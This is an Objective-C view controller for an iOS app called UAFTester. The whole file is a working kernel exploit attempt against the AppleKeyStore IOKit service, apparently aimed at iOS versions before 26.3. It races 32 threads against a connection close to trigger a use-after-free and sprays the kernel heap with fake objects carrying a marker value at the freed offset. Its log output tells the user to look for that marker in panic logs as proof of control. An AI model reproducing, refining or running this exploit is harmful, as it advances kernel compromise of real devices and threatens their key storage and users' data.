//
//  ViewController.m
//  UAFTester
//
//  v7 ULTIMATE - Working heap spray + Fixed order + Complete UI
//

#import "ViewController.h"
#import <IOKit/IOKitLib.h>
#import <mach/mach.h>
#import <pthread.h>
#import <stdatomic.h>

#define AKS_SERVICE  "AppleKeyStore"
#define NUM_RACERS   32
#define MAX_ATTEMPTS 2000

// ========== HEAP SPRAY CONFIGURATION ==========
#define SPRAY_COUNT         200      // Reduced to leave resources for target
#define SPRAY_BUFFER_SIZE   512      // Size of fake object (bytes)
#define SPRAY_DELAY_MS      100      // Delay after spray (milliseconds)
#define SPRAY_RETRY_ON_FAIL 1        // Continue even if some connections fail
// ==============================================

static atomic_int   g_phase  = 0;
static io_connect_t g_conn   = IO_OBJECT_NULL;
static atomic_uint  g_calls  = 0;
static atomic_uint  g_errors = 0;

// ========== HEAP SPRAY GLOBALS ==========
static io_connect_t g_spray_conns[SPRAY_COUNT];
static int g_spray_count = 0;
// ========================================

// ========== HEAP SPRAY: Fake gate object structure ==========
typedef struct {
    uint64_t vtable;                    // +0x00
    uint64_t lock;                      // +0x08
    uint64_t refcount;                  // +0x10
    uint64_t pad1[30];                  // Padding to reach 0x110
    uint64_t target_at_0x110;           // +0x110 - UAF dereference target
    uint64_t pad2[30];                  // Extra padding
} fake_gate_t;
// ============================================================

static void *racer_thread(void *arg) {
    (void)arg;
    while (atomic_load_explicit(&g_phase, memory_order_acquire) < 1)
        ;
    while (atomic_load_explicit(&g_phase, memory_order_relaxed) < 3) {
        uint64_t input[1] = {0};
        uint32_t out_cnt  = 0;
        kern_return_t kr = IOConnectCallMethod(
            g_conn, 10, input, 1, NULL, 0, NULL, &out_cnt, NULL, NULL);
        atomic_fetch_add_explicit(&g_calls, 1, memory_order_relaxed);
        if (kr == MACH_SEND_INVALID_DEST || kr == MACH_SEND_INVALID_RIGHT) {
            atomic_fetch_add_explicit(&g_errors, 1, memory_order_relaxed);
            break;
        }
    }
    return NULL;
}

// ========== HEAP SPRAY FUNCTIONS (OPTIMIZED) ==========

static int heap_spray_init(io_service_t svc, void(^log_callback)(NSString *)) {
    kern_return_t kr;
    int fail_count = 0;
    
    log_callback([NSString stringWithFormat:@"[SPRAY] Starting heap spray: %d connections", SPRAY_COUNT]);
    
    // Step 1: Open IOService connections - STOP if we hit resource limits
    for (int i = 0; i < SPRAY_COUNT; i++) {
        kr = IOServiceOpen(svc, mach_task_self(), 0, &g_spray_conns[i]);
        
        if (kr != KERN_SUCCESS) {
            if (kr == 0xe00002c7) { // kIOReturnNoResources
                log_callback([NSString stringWithFormat:@"[SPRAY] Resource limit at %d connections (expected)", i]);
                g_spray_count = i;
                break; // Stop here, we have enough
            } else {
                fail_count++;
                log_callback([NSString stringWithFormat:@"[SPRAY] Connection %d failed: 0x%x", i, kr]);
                
                // If too many failures, abort
                if (fail_count > 10) {
                    log_callback(@"[SPRAY] Too many failures, aborting");
                    g_spray_count = i - fail_count;
                    return -1;
                }
            }
            g_spray_conns[i] = IO_OBJECT_NULL;
            continue;
        }
        
        // Progress update every 100 connections
        if ((i + 1) % 100 == 0) {
            log_callback([NSString stringWithFormat:@"[SPRAY] Progress: %d/%d", i + 1, SPRAY_COUNT]);
        }
    }
    
    // If we opened full SPRAY_COUNT, set g_spray_count
    if (g_spray_count == 0) {
        g_spray_count = SPRAY_COUNT;
    }
    
    log_callback([NSString stringWithFormat:@"[SPRAY] Opened %d valid connections", g_spray_count]);
    
    // Check if we have enough connections to proceed
    if (g_spray_count < 50) {
        log_callback([NSString stringWithFormat:@"[SPRAY] Only %d connections - too few!", g_spray_count]);
        return -1;
    }
    
    // Step 2: Fill kernel heap with fake gate objects
    fake_gate_t fake_gate;
    memset(&fake_gate, 0x41, sizeof(fake_gate));
    
    // Set recognizable marker at offset 0x110 (the UAF dereference point)
    fake_gate.target_at_0x110 = 0x4242424242424242ULL; // "BBBBBBBB"
    
    log_callback(@"[SPRAY] Filling heap with fake objects...");
    
    int spray_success = 0;
    for (int i = 0; i < g_spray_count; i++) {
        if (g_spray_conns[i] == IO_OBJECT_NULL) continue;
        
        // Try to spray the fake gate object into kernel memory
        kr = IOConnectCallMethod(
            g_spray_conns[i],
            0,                          // selector
            NULL, 0,                    // input scalar
            &fake_gate,                 // input struct - our fake object
            sizeof(fake_gate),
            NULL, NULL,                 // output scalar  
            NULL, NULL                  // output struct
        );
        
        if (kr == KERN_SUCCESS || kr == kIOReturnUnsupported) {
            spray_success++;
        }
        
        // Progress update
        if ((i + 1) % 100 == 0) {
            log_callback([NSString stringWithFormat:@"[SPRAY] Filled: %d/%d (success: %d)", 
                         i + 1, g_spray_count, spray_success]);
        }
    }
    
    log_callback([NSString stringWithFormat:@"[SPRAY] Spray complete: %d successful fills", spray_success]);
    log_callback([NSString stringWithFormat:@"[SPRAY] Waiting %dms for heap to settle...", SPRAY_DELAY_MS]);
    usleep(SPRAY_DELAY_MS * 1000);
    
    return 0;
}

static void heap_spray_cleanup(void(^log_callback)(NSString *)) {
    if (g_spray_count > 0) {
        log_callback([NSString stringWithFormat:@"[SPRAY] Cleaning up %d spray connections", g_spray_count]);
        
        int cleaned = 0;
        for (int i = 0; i < g_spray_count; i++) {
            if (g_spray_conns[i] != MACH_PORT_NULL && g_spray_conns[i] != IO_OBJECT_NULL) {
                IOServiceClose(g_spray_conns[i]);
                mach_port_deallocate(mach_task_self(), g_spray_conns[i]);
                g_spray_conns[i] = MACH_PORT_NULL;
                cleaned++;
            }
        }
        
        g_spray_count = 0;
        log_callback([NSString stringWithFormat:@"[SPRAY] Cleanup complete (%d closed)", cleaned]);
    }
}

// ==========================================

static int run_attempt(void) {
    io_service_t svc = IOServiceGetMatchingService(
        kIOMainPortDefault, IOServiceMatching(AKS_SERVICE));
    if (svc == IO_OBJECT_NULL)
        return -1;
    kern_return_t kr = IOServiceOpen(svc, mach_task_self(), 0, &g_conn);
    IOObjectRelease(svc);
    if (kr != KERN_SUCCESS || g_conn == IO_OBJECT_NULL)
        return -1;

    atomic_store_explicit(&g_phase, 0, memory_order_release);
    atomic_store_explicit(&g_calls, 0, memory_order_relaxed);
    atomic_store_explicit(&g_errors, 0, memory_order_relaxed);

    pthread_t threads[NUM_RACERS];
    for (int i = 0; i < NUM_RACERS; i++)
        pthread_create(&threads[i], NULL, racer_thread, NULL);

    atomic_store_explicit(&g_phase, 1, memory_order_release);
    usleep(500);

    IOServiceClose(g_conn);
    atomic_store_explicit(&g_phase, 2, memory_order_release);
    usleep(20000);

    atomic_store_explicit(&g_phase, 3, memory_order_release);
    for (int i = 0; i < NUM_RACERS; i++)
        pthread_join(threads[i], NULL);

    mach_port_deallocate(mach_task_self(), g_conn);
    g_conn = IO_OBJECT_NULL;
    return 0;
}

@interface ViewController ()
@property (nonatomic, strong) UIButton   *triggerButton;
@property (nonatomic, strong) UILabel    *statusLabel;
@property (nonatomic, strong) UITextView *logView;
@property (nonatomic, assign) BOOL        running;
@end

@implementation ViewController

- (void)viewDidLoad {
    [super viewDidLoad];
    self.view.backgroundColor = UIColor.blackColor;
    [self buildUI];
}

- (void)buildUI {
    UILabel *title = [[UILabel alloc] init];
    title.text = @"AppleKeyStoreUserClient\nclose() UAF + HEAP SPRAY";
    title.font = [UIFont fontWithName:@"Menlo-Bold" size:18];
    title.textColor = UIColor.whiteColor;
    title.textAlignment = NSTextAlignmentCenter;
    title.numberOfLines = 2;
    title.translatesAutoresizingMaskIntoConstraints = NO;
    [self.view addSubview:title];

    UILabel *subtitle = [[UILabel alloc] init];
    subtitle.text = [NSString stringWithFormat:@"v7 ULTIMATE: Fixed Order (max %d spray)\niOS <26.3 RC", SPRAY_COUNT];
    subtitle.font = [UIFont fontWithName:@"Menlo" size:12];
    subtitle.textColor = [UIColor colorWithWhite:0.5 alpha:1.0];
    subtitle.textAlignment = NSTextAlignmentCenter;
    subtitle.numberOfLines = 2;
    subtitle.translatesAutoresizingMaskIntoConstraints = NO;
    [self.view addSubview:subtitle];

    self.triggerButton = [UIButton buttonWithType:UIButtonTypeSystem];
    [self.triggerButton setTitle:@"TRIGGER UAF + SPRAY" forState:UIControlStateNormal];
    self.triggerButton.titleLabel.font = [UIFont fontWithName:@"Menlo-Bold" size:20];
    [self.triggerButton setTitleColor:UIColor.whiteColor forState:UIControlStateNormal];
    self.triggerButton.backgroundColor = [UIColor colorWithRed:0.8 green:0.0 blue:0.0 alpha:1.0];
    self.triggerButton.layer.cornerRadius = 12;
    self.triggerButton.translatesAutoresizingMaskIntoConstraints = NO;
    [self.triggerButton addTarget:self action:@selector(triggerTapped) forControlEvents:UIControlEventTouchUpInside];
    [self.view addSubview:self.triggerButton];

    self.statusLabel = [[UILabel alloc] init];
    self.statusLabel.text = @"Ready";
    self.statusLabel.font = [UIFont fontWithName:@"Menlo" size:14];
    self.statusLabel.textColor = [UIColor colorWithRed:0.0 green:0.8 blue:0.0 alpha:1.0];
    self.statusLabel.textAlignment = NSTextAlignmentCenter;
    self.statusLabel.translatesAutoresizingMaskIntoConstraints = NO;
    [self.view addSubview:self.statusLabel];

    self.logView = [[UITextView alloc] init];
    self.logView.font = [UIFont fontWithName:@"Menlo" size:11];
    self.logView.textColor = [UIColor colorWithRed:0.0 green:0.8 blue:0.0 alpha:1.0];
    self.logView.backgroundColor = [UIColor colorWithWhite:0.1 alpha:1.0];
    self.logView.editable = NO;
    self.logView.layer.cornerRadius = 8;
    self.logView.translatesAutoresizingMaskIntoConstraints = NO;
    [self.view addSubview:self.logView];

    UILayoutGuide *safe = self.view.safeAreaLayoutGuide;
    [NSLayoutConstraint activateConstraints:@[
        [title.topAnchor constraintEqualToAnchor:safe.topAnchor constant:20],
        [title.leadingAnchor constraintEqualToAnchor:safe.leadingAnchor constant:20],
        [title.trailingAnchor constraintEqualToAnchor:safe.trailingAnchor constant:-20],
        [subtitle.topAnchor constraintEqualToAnchor:title.bottomAnchor constant:8],
        [subtitle.leadingAnchor constraintEqualToAnchor:safe.leadingAnchor constant:20],
        [subtitle.trailingAnchor constraintEqualToAnchor:safe.trailingAnchor constant:-20],
        [self.triggerButton.topAnchor constraintEqualToAnchor:subtitle.bottomAnchor constant:24],
        [self.triggerButton.centerXAnchor constraintEqualToAnchor:self.view.centerXAnchor],
        [self.triggerButton.widthAnchor constraintEqualToConstant:280],
        [self.triggerButton.heightAnchor constraintEqualToConstant:56],
        [self.statusLabel.topAnchor constraintEqualToAnchor:self.triggerButton.bottomAnchor constant:16],
        [self.statusLabel.leadingAnchor constraintEqualToAnchor:safe.leadingAnchor constant:20],
        [self.statusLabel.trailingAnchor constraintEqualToAnchor:safe.trailingAnchor constant:-20],
        [self.logView.topAnchor constraintEqualToAnchor:self.statusLabel.bottomAnchor constant:12],
        [self.logView.leadingAnchor constraintEqualToAnchor:safe.leadingAnchor constant:16],
        [self.logView.trailingAnchor constraintEqualToAnchor:safe.trailingAnchor constant:-16],
        [self.logView.bottomAnchor constraintEqualToAnchor:safe.bottomAnchor constant:-16],
    ]];
}

- (void)appendLog:(NSString *)line {
    dispatch_async(dispatch_get_main_queue(), ^{
        self.logView.text = [self.logView.text stringByAppendingFormat:@"%@\n", line];
        [self.logView scrollRangeToVisible:NSMakeRange(self.logView.text.length - 1, 1)];
    });
}

- (void)setStatus:(NSString *)text color:(UIColor *)color {
    dispatch_async(dispatch_get_main_queue(), ^{
        self.statusLabel.text = text;
        self.statusLabel.textColor = color;
    });
}

- (void)triggerTapped {
    if (self.running) return;
    self.running = YES;
    self.logView.text = @"";
    self.triggerButton.enabled = NO;
    self.triggerButton.backgroundColor = [UIColor colorWithWhite:0.3 alpha:1.0];

    [self appendLog:@"========================================"];
    [self appendLog:@"  UAF + HEAP SPRAY v7 ULTIMATE"];
    [self appendLog:@"========================================"];
    [self appendLog:@"[*] FIXED ORDER: Target first, spray second"];
    [self appendLog:[NSString stringWithFormat:@"[*] Max spray: %d (adaptive)", SPRAY_COUNT]];
    [self appendLog:[NSString stringWithFormat:@"[*] Attempts: %d (racers: %d)", MAX_ATTEMPTS, NUM_RACERS]];
    [self appendLog:@""];
    [self setStatus:@"Initializing..." color:UIColor.yellowColor];

    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        io_service_t svc = IOServiceGetMatchingService(
            kIOMainPortDefault, IOServiceMatching(AKS_SERVICE));
        if (svc == IO_OBJECT_NULL) {
            [self appendLog:@"[-] AppleKeyStore service not found"];
            [self setStatus:@"Service not found" color:UIColor.redColor];
            [self finishRun];
            return;
        }
        [self appendLog:@"[+] AppleKeyStore service found"];
        [self appendLog:@""];
        
        // ========== CRITICAL FIX: Open target connection FIRST ==========
        [self appendLog:@">>> PHASE 1: OPEN TARGET CONNECTION"];
        [self setStatus:@"Opening target..." color:[UIColor colorWithRed:1.0 green:0.6 blue:0.0 alpha:1.0]];
        
        kern_return_t kr = IOServiceOpen(svc, mach_task_self(), 0, &g_conn);
        if (kr != KERN_SUCCESS || g_conn == IO_OBJECT_NULL) {
            [self appendLog:@"[-] Failed to open target connection"];
            [self setStatus:@"Target open failed" color:UIColor.redColor];
            IOObjectRelease(svc);
            [self finishRun];
            return;
        }
        
        [self appendLog:@"[+] Target connection opened"];
        [self appendLog:[NSString stringWithFormat:@"[+] Connection handle: 0x%x", g_conn]];
        [self appendLog:@""];
        
        // Close target temporarily before spray (will reopen for each attempt)
        IOServiceClose(g_conn);
        g_conn = IO_OBJECT_NULL;
        // =================================================================
        
        // ========== PHASE 2: HEAP SPRAY (with remaining resources) ==========
        [self appendLog:@">>> PHASE 2: HEAP SPRAY"];
        [self setStatus:@"Heap spraying..." color:[UIColor colorWithRed:1.0 green:0.6 blue:0.0 alpha:1.0]];
        
        int spray_result = heap_spray_init(svc, ^(NSString *msg) {
            [self appendLog:msg];
        });
        
        if (spray_result < 0) {
            [self appendLog:@"[-] Heap spray failed!"];
            [self setStatus:@"Spray failed" color:UIColor.redColor];
            IOObjectRelease(svc);
            heap_spray_cleanup(^(NSString *msg) { [self appendLog:msg]; });
            [self finishRun];
            return;
        }
        
        [self appendLog:[NSString stringWithFormat:@"[+] Heap spray OK (%d connections active)", g_spray_count]];
        [self appendLog:@""];
        // =====================================================================
        
        IOObjectRelease(svc);
        
        // ========== PHASE 3: UAF TRIGGER ==========
        [self appendLog:@">>> PHASE 3: UAF TRIGGER"];
        [self setStatus:@"Triggering UAF..." color:[UIColor colorWithRed:1.0 green:0.4 blue:0.0 alpha:1.0]];

        for (int i = 0; i < MAX_ATTEMPTS; i++) {
            if (run_attempt() < 0)
                usleep(50000);
            usleep(1000);

            if ((i + 1) % 50 == 0 || i == 0) {
                [self appendLog:[NSString stringWithFormat:@"[%4d] calls=%u port_dead=%u",
                                 i + 1, atomic_load(&g_calls), atomic_load(&g_errors)]];
                [self setStatus:[NSString stringWithFormat:@"Racing %d/%d", i + 1, MAX_ATTEMPTS]
                          color:[UIColor colorWithRed:1.0 green:0.4 blue:0.0 alpha:1.0]];
            }
        }

        [self appendLog:@""];
        [self appendLog:@"========================================"];
        [self appendLog:[NSString stringWithFormat:@"  COMPLETED: %d attempts", MAX_ATTEMPTS]];
        [self appendLog:@"========================================"];
        
        // Check if device survived
        [self appendLog:@"[+] Device survived - analyzing results..."];
        
        if (atomic_load(&g_errors) > 0) {
            [self appendLog:[NSString stringWithFormat:@"[*] Port deaths detected: %u", atomic_load(&g_errors)]];
            [self appendLog:@""];
            [self appendLog:@"✓✓✓ UAF TRIGGERED SUCCESSFULLY! ✓✓✓"];
            [self appendLog:@""];
            [self appendLog:@"Next steps:"];
            [self appendLog:@"1. Check for panic log (Settings → Analytics)"];
            [self appendLog:@"2. Look for x16 register = 0x4242424242424242"];
            [self appendLog:@"3. If you see 0x4242... = HEAP SPRAY SUCCESS!"];
            [self setStatus:@"UAF TRIGGERED!" color:[UIColor colorWithRed:0.0 green:1.0 blue:0.0 alpha:1.0]];
        } else {
            [self appendLog:@"[*] No port deaths - race might need tuning"];
            [self appendLog:@"[*] Try running again or check system logs"];
            [self setStatus:@"Completed (no panic)" color:[UIColor colorWithRed:0.0 green:0.8 blue:0.0 alpha:1.0]];
        }
        
        // Cleanup spray connections
        [self appendLog:@""];
        heap_spray_cleanup(^(NSString *msg) {
            [self appendLog:msg];
        });
        
        [self finishRun];
    });
}

- (void)finishRun {
    dispatch_async(dispatch_get_main_queue(), ^{
        self.running = NO;
        self.triggerButton.enabled = YES;
        self.triggerButton.backgroundColor = [UIColor colorWithRed:0.8 green:0.0 blue:0.0 alpha:1.0];
    });
}

- (UIStatusBarStyle)preferredStatusBarStyle {
    return UIStatusBarStyleLightContent;
}

@end
